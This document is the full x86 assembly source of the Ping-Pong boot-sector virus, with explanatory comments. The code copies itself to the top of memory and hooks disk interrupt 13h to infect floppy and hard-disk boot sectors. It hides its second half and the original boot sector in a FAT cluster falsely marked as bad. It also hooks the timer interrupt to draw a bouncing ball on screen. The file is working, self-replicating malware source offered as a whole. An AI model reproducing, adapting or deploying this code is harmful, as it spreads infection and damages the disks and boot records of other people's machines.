

help	segment
null	proc	far
	endp
help	ends

code    segment 
assume	cs:code, ds:code
	org	7c00h

TOP	equ	00h			;top margin for moving ball
BOTTOM	equ	18h			;bottom margin for moving ball
LEFT	equ	00h			;left margin for moving ball

ACTIVE	equ	01h			;PingPong VIRUS is active
DEFINED equ	02h			;INT 08h is redefined
FAT16	equ	04h			;using 12 bit FAT
DELAY	equ	24h			;copy delay

TEXT	equ	00h			;using text mode
GRAPHCS equ	01h			;using graphics mode
COLTEXT equ	03h			;COLor TEXT mode
MDA	equ	07h			;Monochrome Display Adaptor

oldINT08	equ	08h*4		;INT 08h vector's place
oldINT13	equ	13h*4		;INT 13h vector's place
off		equ	0400h		;offset difference between 7C00 & 8000
RAMsize 	equ	0413h		;BIOS variable - size of RAM memory

start:  jmp     short initVIR
	nop

	db	'MSDOS3.3'              ;BOOT sector info - system name
SectSiz dw	?			;		  - size of sector
ClusSiz db	?			;		  - sectors per cluster
ResSecs dw	?			;		  - reserved sectors
FatCnt	db	?			;		  - number of FAT
RootSiz dw	?			;		  - maximum Root entries
TotSecs dw	?			;		  - total sectors number
Media	db	?			;		  - media descriptor
FatSize dw	?			;		  - FAT sector number
TrkSecs dw	?			;		  - sectors per track
HeadCnt dw	?			;		  - heads number
HidnSec dw	?			;		  - skipped sectors

initVIR:xor     ax,ax                   ;SS:SP=0000:7C00
	mov	ss,ax
	mov	sp,7C00h
	mov	ds,ax
	mov	ax,word ptr ds:RAMsize	;get RAM size in KB
	sub	ax,2			;reserve 2KB
	mov	word ptr ds:RAMsize,ax	;set new RAMsize
	mov	cl,6			;size of segment
	shl	ax,cl			;convert KB->segment address
	sub	ax,07C0h		;I want IP to have value 7C00
	mov	es,ax			;set new place
	mov	si,7C00h		;start of this boot
	mov	di,si			;start of future resident part
	mov	cx,0100h		;length of this booter
	rep	movsw			;transfer boot to end of memory

;	mov	cs,ax			;jump to copy of virus
	db	8eh,0c8h
	push	cs
	pop	ds			;set DATA segment
	call	Vir			;save return address

Vir:	xor	ah,ah
	int	13h			;recalibrate disk

	and	byte ptr Drive,80h	;don't use other than A: or C: disk now
	mov	bx,word ptr Bad 	;get sector number of bad cluster
	push	cs			;- it is second part of PING-PONG
	pop	ax
	sub	ax,20h
	mov	es,ax			;set Load address to 0000:7E00 (buffer)
	call	read
	mov	bx,word ptr Bad 	;get sector number of bad cluster+1
	inc	bx			;- it is Backup BOOT
	mov	ax,-40h 		;now load on address 0000:7C00
	mov	es,ax
	call	read
	xor	ax,ax
	mov	byte ptr Watch,al	;reset all flags
	mov	ds,ax
	mov	ax,word ptr ds:oldINT13 ;read old value of INT 13h vector
	mov	bx,word ptr ds:oldINT13+2
	mov	word ptr ds:oldINT13,offset DiskIO
	mov	word ptr ds:oldINT13+2,cs
	push	cs			;restore DATA segment
	pop	ds
	mov	word ptr callINT+1,ax
	mov	word ptr callINT+3,bx
	mov	dl,byte ptr Drive	;restore drive
	jmp	far ptr null
	org	$-4
	dd	7c00h			;and start origin BOOT of DOS

write:	mov	ax,0301h		;write 1 sector
	jmp	short rdwr
read:	mov	ax,201h 		;read 1 sector

rdwr:	xchg	ax,bx			;save service mark, get sector number
	add	ax,word ptr ds:HidnSec	;add first data sector
	xor	dx,dx
	div	word ptr ds:TrkSecs	;divide by sectors per track
	inc	dl			;sectors numbered from 1
	mov	ch,dl			;save sector number
	xor	dx,dx
	div	word ptr HeadCnt	;divide by number of heads
	mov	cl,6
	shl	ah,cl			;correct cylinder number
	or	ah,ch			;add sector number
	mov	cx,ax
	xchg	ch,cl			;swap bytes
	mov	dh,dl			;get head number
	mov	ax,bx			;set READ/WRITE 1 sector mark

Direct: mov	dl,byte ptr Drive	;get drive to read/write from/to
	mov	bx,offset buffer	;buffer address
	int	13h			;read selected sector

	jnc	retread 		;normal return if no error
	pop	ax			;pick up return address, make exit
retread:retn

DiskIO: push	ds			;new INT 13h server
	push	es
	push	ax
	push	bx
	push	cx
	push	dx
	push	cs
	pop	ds
	push	cs
	pop	es
	test	byte ptr Watch,ACTIVE
	jnz	DiskRet 		;return if not active
	cmp	ah,2			;read operation ?
	jne	DiskRet 		;return if no
	cmp	byte ptr Drive,dl	;is is the same drive ?
	mov	byte ptr Drive,dl	;save new drive
	jnz	activty 		;but wait until next read on this drive
	xor	ah,ah			;get ticks
	int	1Ah			;read current 'time'

	test	dh,7Fh			;now test 29min, 59.79sec:
	jnz	dontping		; don't picture PingPong ball
	test	dl,0F0h 		; first 30 minutes
	jnz	dontping
	push	dx			;save ticks
	call	near ptr NewTimr	;redefine INT 08h to VIRus Timer
	pop	dx			;restore ticks
dontping:
	mov	cx,dx
	sub	dx,word ptr oldTick	;get Ticks difference from last pass
	mov	word ptr oldTick,cx	;save new Ticks
	sub	dx,DELAY		;1.98sec flowed from last pass ?
	jc	DiskRet 		;jump if no
activty:or	byte ptr Watch,ACTIVE	;make Virus unactivated
	push	si
	push	di
	call	Attack
	pop	di
	pop	si			;make Virus activated
	and	byte ptr Watch,not ACTIVE
DiskRet:pop	dx
	pop	cx
	pop	bx
	pop	ax
	pop	es
	pop	ds
callINT:jmp	far ptr null
	org	$-4
	dd	00h			;and continue on old INT 13h

Attack: mov	ax,201h 		;read 1 sector
	mov	dh,0			;head 0
	mov	cx,1			;cylinder 0, sector 1
	call	Direct			;directly read sector to buffer
	test	byte ptr Drive,80h	;hard disk used ?
	jz	BOOTred 		;jump if floppy disk used
	mov	si,81BEh		;start of partitions entries in buffer
	mov	cx,4			;four partitions

Entry:	cmp	byte ptr [si+4],1	;12 bit FAT ?
	je	DOS
	cmp	byte ptr [si+4],4	;or 16 bit FAT
	je	DOS
	add	si,10h			;next entry if none
	loop	Entry			;test all partitions
	retn

DOS:	mov	dx,[si] 		;read active/head number
	mov	cx,[si+2]		;     cylinder&sector/system
	mov	ax,201h 		;read 1 sector
	call	Direct			;read this partition BOOT
BOOTred:mov	si,8002h		;start of BOOT info in buffer
	mov	di,7C02h		;start of Virus place for info
	mov	cx,1Ch			;length of BOOT formated area
	rep	movsb			;transfer DISK format info
	cmp	word ptr mark2+off,1357h;disk is marked
	jne	unmarkd 		;jump if unmarked
	cmp	byte ptr mark1+off,0	;!!!SET NC!!!
	jae	DOSret			;return every time (if no carry)
	mov	ax,word ptr Data+off	;!!!no way to go here !!!
	mov	word ptr Data,ax	;set first Data sector on disk
	mov	si,word ptr Bad+off	;read BACKUP BOOT sector number
	jmp	near ptr Restore	;restore PingPong on disk
DOSret: retn

unmarkd:cmp	word ptr SectSiz+off,512;200h bytes per sector ?
	jne	DOSret			;don't support nonstandard disks
	cmp	byte ptr ClusSiz+off,2	;minimally 2 sectors per cluster ?
	jb	DOSret			;too small
	mov	cx,word ptr ResSecs+off ;reserved sectors
	mov	al,byte ptr FatCnt+off	;number of FATs
	cbw
	mul	word ptr FatSize+off	;number of sectors in FAT
	add	cx,ax			;add reserved sectors, save to CX
	mov	ax,20h			;size of directory entry
	mul	word ptr RootSiz+off	;maximum number of root entries
	add	ax,1FFh 		;round it
	mov	bx,200h 		;size of sector
	div	bx			;get number of sectors used for Root
	add	cx,ax			;add reserved, FAT
	mov	word ptr Data,cx	;save first DATA sector number
	mov	ax,word ptr TotSecs	;read total number of sectors
	sub	ax,word ptr Data	;get number of usable sectors
	mov	bl,byte ptr ClusSiz	;read cluster size
	xor	dx,dx
	xor	bh,bh
	div	bx			;count number of usable clusters
	inc	ax			;numbered from 1
	mov	di,ax			;save usable clusters to DI
	and	byte ptr Watch,not FAT16;set using 12 bit FAT
	cmp	ax,0FF0h		;more than 12 bit for clusters ?
	jbe	selcted 		;jump if 12 bit
	or	byte ptr Watch,FAT16	;set using 16 bit FAT

;now try find place for SAVING 2nd part of PingPong & BACKUP of REAL BOOT

selcted:mov	si,2-1			;set first (maybe) matching cluster
	mov	bx,word ptr ResSecs	;reserved sector - first for searching
	dec	bx			;correct for loop
	mov	word ptr Matched,bx	;set first searched FAT sector
	mov	byte ptr Skipped,-2	;correct for loop - skipped FAT sectors
	jmp	short nextFAT		;jump right in the loop

Matched dw	?			;reserved sectors
Data	dw	?			;first Data sector on disk
Watch	db	?			;common flags
Drive	db	?			;last used drive
Bad	dw	?			;sector - 2nd part of PingPong & BOOT
mark1	db	?			;restoring factor
mark2	dw	1357h			;special PINGPONG mark
	dw	0aa55h

nextFAT:inc	word ptr Matched	;next sector test for matching
	mov	bx,word ptr Matched	;get this sector number
	add	byte ptr Skipped,2	;next FAT sector skipped
	call	near ptr read		;read this FAT sector
	jmp	short nxtClst		;try this (SI) cluster
					;SI contains cluster number
testing:mov	ax,3			;size of 1 FAT unit
	test	byte ptr Watch,FAT16	;using 16 bit FAT ?
	jz	smalFAT 		;o.k. if small FAT
	inc	ax			;else use 4 byte unit
smalFAT:mul	si			;calculate address of SI cluster
	shr	ax,1			;divide by 2
	sub	ah,byte ptr Skipped
	mov	bx,ax			;save it
	cmp	bx,1FFh 		;on the end of sector ?
	jnc	nextFAT 		;skip to next Fat sector if yes
	mov	dx,word ptr buffer[bx]	;read FAT information
	test	byte ptr Watch,FAT16	;using 16 bit FAT ?
	jnz	bigFAT			;overskip corrections if 16 bit FAT
	mov	cl,4			;shift by 4 bits
	test	si,1			;Even/Odd cluster ?
	jz	cleven			;jump if Even
	shr	dx,cl			;odd cluster must be corrected
cleven: and	dh,0Fh			;now clear Top nibble for 12bit FAT
bigFAT: test	dx,0FFFFh		;is this cluster used ?
	jz	clear			;jump if is not used
nxtClst:inc	si			;increment cluster number
	cmp	si,di			;last cluster ?
	jbe	testing 		;jump if no
	retn				;return if disk is fully used

clear:	mov	dx,0FFF7h		;BAD CLUSTER mark
	test	byte ptr Watch,FAT16	;using 16 bit FAT ?
	jnz	donshft 		;don't make corrections
	and	dh,0Fh			;clear if 12 bit FAT
	mov	cl,4			;4 bit correction
	test	si,1			;Even/Odd cluster ?
	jz	donshft 		;don't make corrections
	shl	dx,cl
donshft:or	word ptr buffer[bx],dx	;save BAD cluster mark
	mov	bx,word ptr Matched	;found free sector number
	call	near ptr write		;write modified FAT sector
	mov	ax,si			;get BAD cluster number
	sub	ax,2			;cluster numbered from 2
	mov	bl,byte ptr ClusSiz	;get cluster size
	xor	bh,bh

	mul	bx
	add	ax,word ptr Data	;add first Data sector
	mov	si,ax			;save BAD CLUSTER sector number
	mov	bx,0			;BOOT sector
	call	near ptr read		;read sector BX
	mov	bx,si			;restore BAD CLUSTER sector number
	inc	bx			;2nd part of BAD CLUSTER
	call	near ptr write		;make BACKUP of REAL BOOT sector

Restore:mov	bx,si			;get BAD CLUSTER sector number
	mov	word ptr Bad,si 	;save it to VIRUS body
	push	cs			;make 8000h point to 2nd part of VIRUS
	pop	ax
	sub	ax,20h
	mov	es,ax
	call	near ptr write		;write VIR to 1st part of BAD CLUSTER
	push	cs			;make 8000h point to 1st part of VIRUS
	pop	ax
	sub	ax,40h
	mov	es,ax
	mov	bx,0			;BOOT sector
	call	near ptr write		;write 1st part of PingPong to BOOT
	retn

oldTick dw	?			;number of Ticks from CPU start
Skipped db	?			;number of passed sectors that was used

NewTimr:test	byte ptr Watch,DEFINED	;redefine INT 08h ?
	jnz	NewRet			;return if yet redefined
	or	byte ptr Watch,DEFINED	;now set New Timer interrupt
	mov	ax,0
	mov	ds,ax
	mov	ax,word ptr ds:oldINT08 ;read old interrupt vector
	mov	bx,word ptr ds:oldINT08+2
	mov	word ptr ds:oldINT08,offset Timer
	mov	word ptr ds:oldINT08+2,cs
	push	cs
	pop	ds
	mov	word ptr oldTimr+1,ax	;save old vector (modify program)
	mov	word ptr oldTimr+3,bx
NewRet: retn

Timer:	push	ds			;save registers
	push	ax
	push	bx
	push	cx
	push	dx
	push	cs
	pop	ds
	mov	ah,0Fh			;read Video mode AH=Max Columns
	int	10h			;		 AL=Current Mode
					;		 BH=Page Number
	mov	bl,al			;save current mode
	cmp	bx,word ptr oldMode	;compare with old mode & page
	je	NoChange
	mov	word ptr oldMode,bx	;save new mode
	dec	ah			;get last column on screen
	mov	byte ptr Right,ah	;set new right margin
	mov	ah,GRAPHCS		;set graphics mode active (temporrary)
	cmp	bl,MDA			;current mode Hercules MDA?
	jne	compText		;compare CGA/EGA/VGA text modes
	dec	ah			;set AH=00 if MDA text
compText:
	cmp	bl,COLTEXT+1		;current CGA/EGA/VGA color text mode ?
	jae	GrMode
	dec	ah
GrMode: mov	byte ptr Mode,ah	;set Graphic/Text mode used
	mov	word ptr oldPos,(TOP+1)*256+LEFT+1
	mov	word ptr Step,101h	;go DOWN & RIGHT
	mov	ah,3			;read cursor position DX
	int	10h			;	     size     CX
	push	dx			;save old screen position
	mov	dx,word ptr oldPos
	jmp	short Coords		;and evaluate coordinates
NoChange:
	mov	ah,3			;read cursor position DX
	int	10h			;	     size     CX
	push	dx			;save old screen position
	mov	ah,2			;set cursor's position
	mov	dx,word ptr oldPos	;set old ball position
	int	10h
	mov	ax,word ptr oldByte	;get origin character
	cmp	byte ptr Mode,GRAPHCS	;graphics screen on the last pass ?
	jne	lasText 		;if TEXT was used, use old character
	mov	ax,8307h		;else use XORed object
lasText:mov	bl,ah			;set attribute for character
	mov	cx,1			;only 1 char
	mov	ah,9			;write
	int	10h
Coords: mov	cx,word ptr Step	;read step rate
	cmp	dh,TOP			;top most position ?
	jne	Ymin
	xor	ch,0FFh 		;negate step in Y-axis, go DOWN
	inc	ch
Ymin:	cmp	dh,BOTTOM		;bottom most position
	jne	Ymax
	xor	ch,0FFh 		;negate step in Y-axis, go UP
	inc	ch
Ymax:	cmp	dl,LEFT 		;left most position
	jne	Xmin
	xor	cl,0FFh 		;negate step in X-axis, go RIGHT
	inc	cl
Xmin:	cmp	dl,byte ptr Right	;right most position
	jne	Xmax
	xor	cl,0FFh 		;negate step in X-axis, go LEFT
	inc	cl
Xmax:	cmp	cx,word ptr Step	;direction changed ?
	jne	newDir
	mov	ax,word ptr oldByte	;get old screen's character
	and	al,7			;protect 3 low bits
	cmp	al,3			;test Y-mirror
	jne	mirrX			;go to test X-mirror, if not Y-mirror
	xor	ch,0FFh 		;negate step in Y-axis, MIRROR chars Y
	inc	ch
mirrX:	cmp	al,5
	jne	newDir
	xor	cl,0FFh 		;negate step in X-axis, MIRROR chars X
	inc	cl
newDir: add	dl,cl			;count NEW position
	add	dh,ch
	mov	Step,cx 		;save (new) STEP
	mov	word ptr oldPos,dx	;      new  POSITION
	mov	ah,2			;set cursor's position DX
	int	10h
	mov	ah,8			;read Video attr AH
	int	10h			;	    char AL
	mov	word ptr oldByte,ax	;save origin character on screen
	mov	bl,ah			;read attribute value
	cmp	byte ptr Mode,GRAPHCS	;graphics used on the last pass ?
	jne	TextUse 		;jump if TEXT
	mov	bl,83h			;set XORed object if GRAPHICS
TextUse:mov	cx,1			;1 character
	mov	ax,907h 		;write on screen
	int	10h
	pop	dx			;restore old screen cursor's position
	mov	ah,2			;set cursor's position DX
	int	10h
	pop	dx			;restore registers
	pop	cx
	pop	bx
	pop	ax
	pop	ds
oldTimr:jmp	far ptr null		;no matter, do oldINT 08h interrupt
	org	$-4
	dd	00h

oldByte dw	?			;char & attr below BALL 	7fcd
oldPos	dw	?			;position of PingPong ball
Step	dw	?			;step in X & Y axis for ball
Mode	db	?			;last used mode GRAPHICS/TEXT
oldMode dw	?			;page & mode used on last pass
Right	db	?			;max column number-1		7fd6

	org	8000h
buffer	label	byte			;general buffer for INPUT/OUTPUT

code	ends
	end	start

